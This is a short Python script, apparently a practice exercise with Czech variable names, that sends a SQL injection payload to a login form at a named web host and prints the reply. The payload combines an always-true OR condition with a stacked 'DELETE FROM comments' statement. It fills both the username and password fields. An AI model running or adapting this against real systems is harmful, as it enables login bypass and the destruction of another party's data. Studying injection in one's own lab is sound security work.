import mysql.connector

print('ahoj')
jmeno = ' anything\' OR \'x\'=\'x; DELETE FROM comments WHERE id = \'1\'; -- '

from twill.commands import *
print(jmeno)
import requests
url = 'http://apache1.willilazarov.cz/'
values = {'username': jmeno ,
          'password': jmeno }

r = requests.post(url, data=values)
print(r.content)
